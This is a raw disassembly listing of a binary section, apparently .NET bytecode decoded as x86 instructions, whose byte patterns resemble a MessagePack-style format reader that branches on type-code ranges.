  404c4e:	07                   	pop    %es
  404c4f:	8e 69 17             	mov    0x17(%ecx),%gs
  404c52:	3e 41                	ds inc %ecx
  404c54:	00 00                	add    %al,(%eax)
  404c56:	00 16                	add    %dl,(%esi)
  404c58:	0d 38 32 00 00       	or     $0x3238,%eax
  404c5d:	00 07                	add    %al,(%edi)
  404c5f:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c65:	0c 06                	or     $0x6,%al
  404c67:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c6a:	00 00                	add    %al,(%eax)
  404c6c:	06                   	push   %es
  404c6d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c70:	04 3a                	add    $0x3a,%al
  404c72:	13 00                	adc    (%eax),%eax
  404c74:	00 00                	add    %al,(%eax)
  404c76:	06                   	push   %es
  404c77:	6f                   	outsl  %ds:(%esi),(%dx)
  404c78:	6f                   	outsl  %ds:(%esi),(%dx)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	0a 06                	or     (%esi),%al
  404c7e:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c81:	00 00                	add    %al,(%eax)
  404c83:	06                   	push   %es
  404c84:	38 03                	cmp    %al,(%ebx)
  404c86:	00 00                	add    %al,(%eax)
  404c88:	00 11                	add    %dl,(%ecx)
  404c8a:	04 0a                	add    $0xa,%al
  404c8c:	09 17                	or     %edx,(%edi)
  404c8e:	58                   	pop    %eax
  404c8f:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c94:	17                   	pop    %ss
  404c95:	59                   	pop    %ecx
  404c96:	32 c6                	xor    %dh,%al
  404c98:	07                   	pop    %es
  404c99:	07                   	pop    %es
  404c9a:	8e 69 17             	mov    0x17(%ecx),%gs
  404c9d:	59                   	pop    %ecx
  404c9e:	a3 38 00 00 01       	mov    %eax,0x1000038
  404ca3:	0c 06                	or     $0x6,%al
  404ca5:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca8:	00 00                	add    %al,(%eax)
  404caa:	06                   	push   %es
  404cab:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404cb1:	0e                   	push   %cs
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	00 06                	add    %al,(%esi)
  404cb6:	7b 38                	jnp    0x404cf0
  404cb8:	00 00                	add    %al,(%eax)
  404cba:	04 11                	add    $0x11,%al
  404cbc:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cc1:	0a 2a                	or     (%edx),%ch
  404cc3:	06                   	push   %es
  404cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	0a 06                	or     (%esi),%al
  404ccb:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	06                   	push   %es
  404cd1:	06                   	push   %es
  404cd2:	2a 00                	sub    (%eax),%al
  404cd4:	1b 30                	sbb    (%eax),%esi
  404cd6:	04 00                	add    $0x0,%al
  404cd8:	3b 00                	cmp    (%eax),%eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	24 00                	and    $0x0,%al
  404cde:	00 11                	add    %dl,(%ecx)
  404ce0:	73 d0                	jae    0x404cb2
  404ce2:	00 00                	add    %al,(%eax)
  404ce4:	0a 0a                	or     (%edx),%cl
  404ce6:	03 28                	add    (%eax),%ebp
  404ce8:	a2 00 00 06 10       	mov    %al,0x10060000
  404ced:	01 06                	add    %eax,(%esi)
  404cef:	03 16                	add    (%esi),%edx
  404cf1:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cf7:	00 0a                	add    %cl,(%edx)
  404cf9:	06                   	push   %es
  404cfa:	16                   	push   %ss
  404cfb:	6a 6f                	push   $0x6f
  404cfd:	4e                   	dec    %esi
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	0a 02                	or     (%edx),%al
  404d02:	06                   	push   %es
  404d03:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d09:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d0e:	39 06                	cmp    %eax,(%esi)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	00 06                	add    %al,(%esi)
  404d14:	6f                   	outsl  %ds:(%esi),(%dx)
  404d15:	33 00                	xor    (%eax),%eax
  404d17:	00 0a                	add    %cl,(%edx)
  404d19:	dc 2a                	fsubrl (%edx)
  404d1b:	00 01                	add    %al,(%ecx)
  404d1d:	10 00                	adc    %al,(%eax)
  404d1f:	00 02                	add    %al,(%edx)
  404d21:	00 06                	add    %al,(%esi)
  404d23:	00 27                	add    %ah,(%edi)
  404d25:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	13 30                	adc    (%eax),%esi
  404d2e:	02 00                	add    (%eax),%al
  404d30:	16                   	push   %ss
  404d31:	00 00                	add    %al,(%eax)
  404d33:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d39:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d3c:	00 00                	add    %al,(%eax)
  404d3e:	0a 0a                	or     (%edx),%cl
  404d40:	02 06                	add    (%esi),%al
  404d42:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d48:	6f                   	outsl  %ds:(%esi),(%dx)
  404d49:	40                   	inc    %eax
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	0a 2a                	or     (%edx),%ch
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	13 30                	adc    (%eax),%esi
  404d52:	04 00                	add    $0x0,%al
  404d54:	07                   	pop    %es
  404d55:	06                   	push   %es
  404d56:	00 00                	add    %al,(%eax)
  404d58:	26 00 00             	add    %al,%es:(%eax)
  404d5b:	11 03                	adc    %eax,(%ebx)
  404d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d5e:	00 01                	add    %al,(%ecx)
  404d60:	00 0a                	add    %cl,(%edx)
  404d62:	d2 0a                	rorb   %cl,(%edx)
  404d64:	14 0b                	adc    $0xb,%al
  404d66:	16                   	push   %ss
  404d67:	0c 16                	or     $0x16,%al
  404d69:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d6e:	09 00                	or     %eax,(%eax)
  404d70:	00 00                	add    %al,(%eax)
  404d72:	02 06                	add    (%esi),%al
  404d74:	6e                   	outsb  %ds:(%esi),(%dx)
  404d75:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d79:	06                   	push   %es
  404d7a:	2a 06                	sub    (%esi),%al
  404d7c:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d82:	48                   	dec    %eax
  404d83:	00 00                	add    %al,(%eax)
  404d85:	00 06                	add    %al,(%esi)
  404d87:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d8d:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d92:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d95:	00 06                	add    %al,(%esi)
  404d97:	02 18                	add    (%eax),%bl
  404d99:	7d 36                	jge    0x404dd1
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	04 06                	add    $0x6,%al
  404d9f:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404da5:	0c 16                	or     $0x16,%al
  404da7:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404dac:	00 02                	add    %al,(%edx)
  404dae:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404db2:	06                   	push   %es
  404db3:	25 03 28 96 00       	and    $0x962803,%eax
  404db8:	00 06                	add    %al,(%esi)
  404dba:	6f                   	outsl  %ds:(%esi),(%dx)
  404dbb:	6a 00                	push   $0x0
  404dbd:	00 06                	add    %al,(%esi)
  404dbf:	03 6f 88             	add    -0x78(%edi),%ebp
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	06                   	push   %es
  404dc5:	09 17                	or     %edx,(%edi)
  404dc7:	58                   	pop    %eax
  404dc8:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dcd:	2a 06                	sub    (%esi),%al
  404dcf:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dd5:	3c 00                	cmp    $0x0,%al
  404dd7:	00 00                	add    %al,(%eax)
  404dd9:	06                   	push   %es
  404dda:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404de0:	31 00                	xor    %eax,(%eax)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	02 28                	add    (%eax),%ch
  404de6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de9:	06                   	push   %es
  404dea:	02 19                	add    (%ecx),%bl
  404dec:	7d 36                	jge    0x404e24
  404dee:	00 00                	add    %al,(%eax)
  404df0:	04 06                	add    $0x6,%al
  404df2:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df8:	0c 16                	or     $0x16,%al
  404dfa:	0d 38 10 00 00       	or     $0x1038,%eax
  404dff:	00 02                	add    %al,(%edx)
  404e01:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404e05:	06                   	push   %es
  404e06:	03 6f 88             	add    -0x78(%edi),%ebp
  404e09:	00 00                	add    %al,(%eax)
  404e0b:	06                   	push   %es
  404e0c:	09 17                	or     %edx,(%edi)
  404e0e:	58                   	pop    %eax
  404e0f:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e14:	2a 06                	sub    (%esi),%al
  404e16:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e1c:	21 00                	and    %eax,(%eax)
  404e1e:	00 00                	add    %al,(%eax)
  404e20:	06                   	push   %es
  404e21:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e27:	16                   	push   %ss
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	00 06                	add    %al,(%esi)
  404e2c:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e32:	0c 02                	or     $0x2,%al
  404e34:	03 08                	add    (%eax),%ecx
  404e36:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e3c:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e42:	20 e0                	and    %ah,%al
  404e44:	00 00                	add    %al,(%eax)
  404e46:	00 3f                	add    %bh,(%edi)
  404e48:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e4d:	20 ff                	and    %bh,%bh
  404e4f:	00 00                	add    %al,(%eax)
  404e51:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e57:	02 06                	add    (%esi),%al
  404e59:	67 6a 28             	addr16 push $0x28
  404e5c:	74 00                	je     0x404e5e
  404e5e:	00 06                	add    %al,(%esi)
  404e60:	2a 06                	sub    (%esi),%al
  404e62:	20 c0                	and    %al,%al
  404e64:	00 00                	add    %al,(%eax)
  404e66:	00 40 07             	add    %al,0x7(%eax)
  404e69:	00 00                	add    %al,(%eax)
  404e6b:	00 02                	add    %al,(%edx)
  404e6d:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e73:	06                   	push   %es
  404e74:	20 c1                	and    %al,%cl
  404e76:	00 00                	add    %al,(%eax)
  404e78:	00 40 0b             	add    %al,0xb(%eax)
  404e7b:	00 00                	add    %al,(%eax)
  404e7d:	00 72 01             	add    %dh,0x1(%edx)
  404e80:	27                   	daa
  404e81:	00 70 73             	add    %dh,0x73(%eax)
  404e84:	01 01                	add    %eax,(%ecx)
  404e86:	00 0a                	add    %cl,(%edx)
  404e88:	7a 06                	jp     0x404e90
  404e8a:	20 c2                	and    %al,%dl
  404e8c:	00 00                	add    %al,(%eax)
  404e8e:	00 40 08             	add    %al,0x8(%eax)
  404e91:	00 00                	add    %al,(%eax)
  404e93:	00 02                	add    %al,(%edx)
  404e95:	16                   	push   %ss
  404e96:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e9c:	06                   	push   %es
  404e9d:	20 c3                	and    %al,%bl
  404e9f:	00 00                	add    %al,(%eax)
  404ea1:	00 40 08             	add    %al,0x8(%eax)
  404ea4:	00 00                	add    %al,(%eax)
  404ea6:	00 02                	add    %al,(%edx)
  404ea8:	17                   	pop    %ss
  404ea9:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404eaf:	06                   	push   %es
  404eb0:	20 c4                	and    %al,%ah
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	00 40 20             	add    %al,0x20(%eax)
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	00 03                	add    %al,(%ebx)
  404ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebc:	00 01                	add    %al,(%ecx)
  404ebe:	00 0a                	add    %cl,(%edx)
  404ec0:	0c 08                	or     $0x8,%al
  404ec2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ec6:	01 0b                	add    %ecx,(%ebx)
  404ec8:	03 07                	add    (%edi),%eax
  404eca:	16                   	push   %ss
  404ecb:	08 6f 45             	or     %ch,0x45(%edi)
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	0a 26                	or     (%esi),%ah
  404ed2:	02 07                	add    (%edi),%al
  404ed4:	28 79 00             	sub    %bh,0x0(%ecx)
  404ed7:	00 06                	add    %al,(%esi)
  404ed9:	2a 06                	sub    (%esi),%al
  404edb:	20 c5                	and    %al,%ch
  404edd:	00 00                	add    %al,(%eax)
  404edf:	00 40 39             	add    %al,0x39(%eax)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	00 18                	add    %bl,(%eax)
  404ee6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404eea:	01 0b                	add    %ecx,(%ebx)
  404eec:	03 07                	add    (%edi),%eax
  404eee:	16                   	push   %ss
  404eef:	18 6f 45             	sbb    %ch,0x45(%edi)
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	0a 26                	or     (%esi),%ah
  404ef6:	07                   	pop    %es
  404ef7:	28 58 00             	sub    %bl,0x0(%eax)
  404efa:	00 06                	add    %al,(%esi)
  404efc:	0b 07                	or     (%edi),%eax
  404efe:	16                   	push   %ss
  404eff:	28 02                	sub    %al,(%edx)
  404f01:	01 00                	add    %eax,(%eax)
  404f03:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f06:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f0a:	01 0b                	add    %ecx,(%ebx)
  404f0c:	03 07                	add    (%edi),%eax
  404f0e:	16                   	push   %ss
  404f0f:	08 6f 45             	or     %ch,0x45(%edi)
  404f12:	00 00                	add    %al,(%eax)
  404f14:	0a 26                	or     (%esi),%ah
  404f16:	02 07                	add    (%edi),%al
  404f18:	28 79 00             	sub    %bh,0x0(%ecx)
  404f1b:	00 06                	add    %al,(%esi)
  404f1d:	2a 06                	sub    (%esi),%al
  404f1f:	20 c6                	and    %al,%dh
  404f21:	00 00                	add    %al,(%eax)
  404f23:	00 40 39             	add    %al,0x39(%eax)
  404f26:	00 00                	add    %al,(%eax)
  404f28:	00 1a                	add    %bl,(%edx)
  404f2a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f2e:	01 0b                	add    %ecx,(%ebx)
  404f30:	03 07                	add    (%edi),%eax
  404f32:	16                   	push   %ss
  404f33:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f36:	00 00                	add    %al,(%eax)
  404f38:	0a 26                	or     (%esi),%ah
  404f3a:	07                   	pop    %es
  404f3b:	28 58 00             	sub    %bl,0x0(%eax)
  404f3e:	00 06                	add    %al,(%esi)
  404f40:	0b 07                	or     (%edi),%eax
  404f42:	16                   	push   %ss
  404f43:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f47:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f4a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f4e:	01 0b                	add    %ecx,(%ebx)
  404f50:	03 07                	add    (%edi),%eax
  404f52:	16                   	push   %ss
  404f53:	08 6f 45             	or     %ch,0x45(%edi)
  404f56:	00 00                	add    %al,(%eax)
  404f58:	0a 26                	or     (%esi),%ah
  404f5a:	02 07                	add    (%edi),%al
  404f5c:	28 79 00             	sub    %bh,0x0(%ecx)
  404f5f:	00 06                	add    %al,(%esi)
  404f61:	2a 06                	sub    (%esi),%al
  404f63:	20 c7                	and    %al,%bh
  404f65:	00 00                	add    %al,(%eax)
  404f67:	00 3b                	add    %bh,(%ebx)
  404f69:	16                   	push   %ss
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	00 06                	add    %al,(%esi)
  404f6e:	20 c8                	and    %cl,%al
  404f70:	00 00                	add    %al,(%eax)
  404f72:	00 3b                	add    %bh,(%ebx)
  404f74:	0b 00                	or     (%eax),%eax
  404f76:	00 00                	add    %al,(%eax)
  404f78:	06                   	push   %es
  404f79:	20 c9                	and    %cl,%cl
  404f7b:	00 00                	add    %al,(%eax)
  404f7d:	00 40 0b             	add    %al,0xb(%eax)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	00 72 2d             	add    %dh,0x2d(%edx)
  404f85:	27                   	daa
  404f86:	00 70 73             	add    %dh,0x73(%eax)
  404f89:	01 01                	add    %eax,(%ecx)
  404f8b:	00 0a                	add    %cl,(%edx)
  404f8d:	7a 06                	jp     0x404f95
  404f8f:	20 ca                	and    %cl,%dl
  404f91:	00 00                	add    %al,(%eax)
  404f93:	00 40 26             	add    %al,0x26(%eax)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	00 1a                	add    %bl,(%edx)
  404f9a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f9e:	01 0b                	add    %ecx,(%ebx)
  404fa0:	03 07                	add    (%edi),%eax
  404fa2:	16                   	push   %ss
  404fa3:	1a 6f 45             	sbb    0x45(%edi),%ch
  404fa6:	00 00                	add    %al,(%eax)
  404fa8:	0a 26                	or     (%esi),%ah
  404faa:	07                   	pop    %es
  404fab:	28 58 00             	sub    %bl,0x0(%eax)
  404fae:	00 06                	add    %al,(%esi)
  404fb0:	0b 02                	or     (%edx),%eax
  404fb2:	07                   	pop    %es
  404fb3:	16                   	push   %ss
  404fb4:	28 03                	sub    %al,(%ebx)
  404fb6:	01 00                	add    %eax,(%eax)
  404fb8:	0a 28                	or     (%eax),%ch
  404fba:	84 00                	test   %al,(%eax)
  404fbc:	00 06                	add    %al,(%esi)
  404fbe:	2a 06                	sub    (%esi),%al
  404fc0:	20 cb                	and    %cl,%bl
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	00 40 26             	add    %al,0x26(%eax)
  404fc7:	00 00                	add    %al,(%eax)
  404fc9:	00 1e                	add    %bl,(%esi)
  404fcb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fcf:	01 0b                	add    %ecx,(%ebx)
  404fd1:	03 07                	add    (%edi),%eax
  404fd3:	16                   	push   %ss
  404fd4:	1e                   	push   %ds
  404fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd6:	45                   	inc    %ebp
  404fd7:	00 00                	add    %al,(%eax)
  404fd9:	0a 26                	or     (%esi),%ah
  404fdb:	07                   	pop    %es
  404fdc:	28 58 00             	sub    %bl,0x0(%eax)
  404fdf:	00 06                	add    %al,(%esi)
  404fe1:	0b 02                	or     (%edx),%eax
  404fe3:	07                   	pop    %es
  404fe4:	16                   	push   %ss
  404fe5:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe8:	00 0a                	add    %cl,(%edx)
  404fea:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404ff0:	06                   	push   %es
  404ff1:	20 cc                	and    %cl,%ah
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	00 40 11             	add    %al,0x11(%eax)
  404ff8:	00 00                	add    %al,(%eax)
  404ffa:	00 03                	add    %al,(%ebx)
  404ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  404ffd:	00 01                	add    %al,(%ecx)
  404fff:	00 0a                	add    %cl,(%edx)
  405001:	d2 0a                	rorb   %cl,(%edx)
  405003:	02 06                	add    (%esi),%al
  405005:	6e                   	outsb  %ds:(%esi),(%dx)
  405006:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40500a:	06                   	push   %es
  40500b:	2a 06                	sub    (%esi),%al
  40500d:	20 cd                	and    %cl,%ch
  40500f:	00 00                	add    %al,(%eax)
  405011:	00 40 27             	add    %al,0x27(%eax)
  405014:	00 00                	add    %al,(%eax)
  405016:	00 18                	add    %bl,(%eax)
  405018:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40501c:	01 0b                	add    %ecx,(%ebx)
  40501e:	03 07                	add    (%edi),%eax
  405020:	16                   	push   %ss
  405021:	18 6f 45             	sbb    %ch,0x45(%edi)
  405024:	00 00                	add    %al,(%eax)
  405026:	0a 26                	or     (%esi),%ah
  405028:	07                   	pop    %es
  405029:	28 58 00             	sub    %bl,0x0(%eax)
  40502c:	00 06                	add    %al,(%esi)
  40502e:	0b 02                	or     (%edx),%eax
  405030:	07                   	pop    %es
  405031:	16                   	push   %ss
  405032:	28 02                	sub    %al,(%edx)
  405034:	01 00                	add    %eax,(%eax)
  405036:	0a 6e 28             	or     0x28(%esi),%ch
  405039:	74 00                	je     0x40503b
  40503b:	00 06                	add    %al,(%esi)
  40503d:	2a 06                	sub    (%esi),%al
  40503f:	20 ce                	and    %cl,%dh
  405041:	00 00                	add    %al,(%eax)
  405043:	00 40 27             	add    %al,0x27(%eax)
  405046:	00 00                	add    %al,(%eax)
  405048:	00 1a                	add    %bl,(%edx)
  40504a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40504e:	01 0b                	add    %ecx,(%ebx)
  405050:	03 07                	add    (%edi),%eax
  405052:	16                   	push   %ss
  405053:	1a 6f 45             	sbb    0x45(%edi),%ch
  405056:	00 00                	add    %al,(%eax)
  405058:	0a 26                	or     (%esi),%ah
  40505a:	07                   	pop    %es
  40505b:	28 58 00             	sub    %bl,0x0(%eax)
  40505e:	00 06                	add    %al,(%esi)
  405060:	0b 02                	or     (%edx),%eax
  405062:	07                   	pop    %es
  405063:	16                   	push   %ss
  405064:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  40506a:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40506e:	06                   	push   %es
  40506f:	2a 06                	sub    (%esi),%al
  405071:	20 cf                	and    %cl,%bh
  405073:	00 00                	add    %al,(%eax)
  405075:	00 40 26             	add    %al,0x26(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 1e                	add    %bl,(%esi)
  40507c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405080:	01 0b                	add    %ecx,(%ebx)
  405082:	03 07                	add    (%edi),%eax
  405084:	16                   	push   %ss
  405085:	1e                   	push   %ds
  405086:	6f                   	outsl  %ds:(%esi),(%dx)
  405087:	45                   	inc    %ebp
  405088:	00 00                	add    %al,(%eax)
  40508a:	0a 26                	or     (%esi),%ah
  40508c:	07                   	pop    %es
  40508d:	28 58 00             	sub    %bl,0x0(%eax)
  405090:	00 06                	add    %al,(%esi)
  405092:	0b 02                	or     (%edx),%eax
  405094:	07                   	pop    %es
  405095:	16                   	push   %ss
  405096:	28 06                	sub    %al,(%esi)
  405098:	01 00                	add    %eax,(%eax)
  40509a:	0a 28                	or     (%eax),%ch
  40509c:	75 00                	jne    0x40509e
  40509e:	00 06                	add    %al,(%esi)
  4050a0:	2a 06                	sub    (%esi),%al
  4050a2:	20 dc                	and    %bl,%ah
  4050a4:	00 00                	add    %al,(%eax)
  4050a6:	00 40 49             	add    %al,0x49(%eax)
  4050a9:	00 00                	add    %al,(%eax)
  4050ab:	00 18                	add    %bl,(%eax)
  4050ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050b1:	01 0b                	add    %ecx,(%ebx)
  4050b3:	03 07                	add    (%edi),%eax
  4050b5:	16                   	push   %ss
  4050b6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b9:	00 00                	add    %al,(%eax)
  4050bb:	0a 26                	or     (%esi),%ah
  4050bd:	07                   	pop    %es
  4050be:	28 58 00             	sub    %bl,0x0(%eax)
  4050c1:	00 06                	add    %al,(%esi)
  4050c3:	0b 07                	or     (%edi),%eax
  4050c5:	16                   	push   %ss
  4050c6:	28 07                	sub    %al,(%edi)
  4050c8:	01 00                	add    %eax,(%eax)
  4050ca:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050cd:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050d0:	00 06                	add    %al,(%esi)
  4050d2:	02 19                	add    (%ecx),%bl
  4050d4:	7d 36                	jge    0x40510c
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	04 16                	add    $0x16,%al
  4050da:	0d 38 10 00 00       	or     $0x1038,%eax
  4050df:	00 02                	add    %al,(%edx)
  4050e1:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050e5:	06                   	push   %es
  4050e6:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e9:	00 00                	add    %al,(%eax)
  4050eb:	06                   	push   %es
  4050ec:	09 17                	or     %edx,(%edi)
  4050ee:	58                   	pop    %eax
  4050ef:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050f4:	2a 06                	sub    (%esi),%al
  4050f6:	20 dd                	and    %bl,%ch
  4050f8:	00 00                	add    %al,(%eax)
  4050fa:	00 40 49             	add    %al,0x49(%eax)
  4050fd:	00 00                	add    %al,(%eax)
  4050ff:	00 1a                	add    %bl,(%edx)
  405101:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405105:	01 0b                	add    %ecx,(%ebx)
  405107:	03 07                	add    (%edi),%eax
  405109:	16                   	push   %ss
  40510a:	1a 6f 45             	sbb    0x45(%edi),%ch
  40510d:	00 00                	add    %al,(%eax)
  40510f:	0a 26                	or     (%esi),%ah
  405111:	07                   	pop    %es
  405112:	28 58 00             	sub    %bl,0x0(%eax)
  405115:	00 06                	add    %al,(%esi)
  405117:	0b 07                	or     (%edi),%eax
  405119:	16                   	push   %ss
  40511a:	28 07                	sub    %al,(%edi)
  40511c:	01 00                	add    %eax,(%eax)
  40511e:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405121:	28 6b 00             	sub    %ch,0x0(%ebx)
  405124:	00 06                	add    %al,(%esi)
  405126:	02 19                	add    (%ecx),%bl
  405128:	7d 36                	jge    0x405160
  40512a:	00 00                	add    %al,(%eax)
  40512c:	04 16                	add    $0x16,%al
  40512e:	0d 38 10 00 00       	or     $0x1038,%eax
  405133:	00 02                	add    %al,(%edx)
  405135:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405139:	06                   	push   %es
  40513a:	03 6f 88             	add    -0x78(%edi),%ebp
  40513d:	00 00                	add    %al,(%eax)
  40513f:	06                   	push   %es
  405140:	09 17                	or     %edx,(%edi)
  405142:	58                   	pop    %eax
  405143:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405148:	2a 06                	sub    (%esi),%al
  40514a:	20 d9                	and    %bl,%cl
  40514c:	00 00                	add    %al,(%eax)
  40514e:	00 40 0e             	add    %al,0xe(%eax)
  405151:	00 00                	add    %al,(%eax)
  405153:	00 02                	add    %al,(%edx)
  405155:	06                   	push   %es
  405156:	03 28                	add    (%eax),%ebp
  405158:	97                   	xchg   %eax,%edi
  405159:	00 00                	add    %al,(%eax)
  40515b:	06                   	push   %es
  40515c:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405162:	06                   	push   %es
  405163:	20 de                	and    %bl,%dh
  405165:	00 00                	add    %al,(%eax)
  405167:	00 40 55             	add    %al,0x55(%eax)
  40516a:	00 00                	add    %al,(%eax)
  40516c:	00 18                	add    %bl,(%eax)
  40516e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405172:	01 0b                	add    %ecx,(%ebx)
  405174:	03 07                	add    (%edi),%eax
  405176:	16                   	push   %ss
  405177:	18 6f 45             	sbb    %ch,0x45(%edi)
  40517a:	00 00                	add    %al,(%eax)
  40517c:	0a 26                	or     (%esi),%ah
  40517e:	07                   	pop    %es
  40517f:	28 58 00             	sub    %bl,0x0(%eax)
  405182:	00 06                	add    %al,(%esi)
  405184:	0b 07                	or     (%edi),%eax
  405186:	16                   	push   %ss
  405187:	28 07                	sub    %al,(%edi)
  405189:	01 00                	add    %eax,(%eax)
  40518b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40518e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405191:	00 06                	add    %al,(%esi)
  405193:	02 18                	add    (%eax),%bl
  405195:	7d 36                	jge    0x4051cd
  405197:	00 00                	add    %al,(%eax)
  405199:	04 16                	add    $0x16,%al
  40519b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051a0:	00 02                	add    %al,(%edx)
  4051a2:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051a6:	06                   	push   %es
  4051a7:	25 03 28 96 00       	and    $0x962803,%eax
  4051ac:	00 06                	add    %al,(%esi)
  4051ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4051af:	6a 00                	push   $0x0
  4051b1:	00 06                	add    %al,(%esi)
  4051b3:	03 6f 88             	add    -0x78(%edi),%ebp
  4051b6:	00 00                	add    %al,(%eax)
  4051b8:	06                   	push   %es
  4051b9:	09 17                	or     %edx,(%edi)
  4051bb:	58                   	pop    %eax
  4051bc:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051c1:	2a 06                	sub    (%esi),%al
  4051c3:	20 de                	and    %bl,%dh
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	00 40 55             	add    %al,0x55(%eax)
  4051ca:	00 00                	add    %al,(%eax)
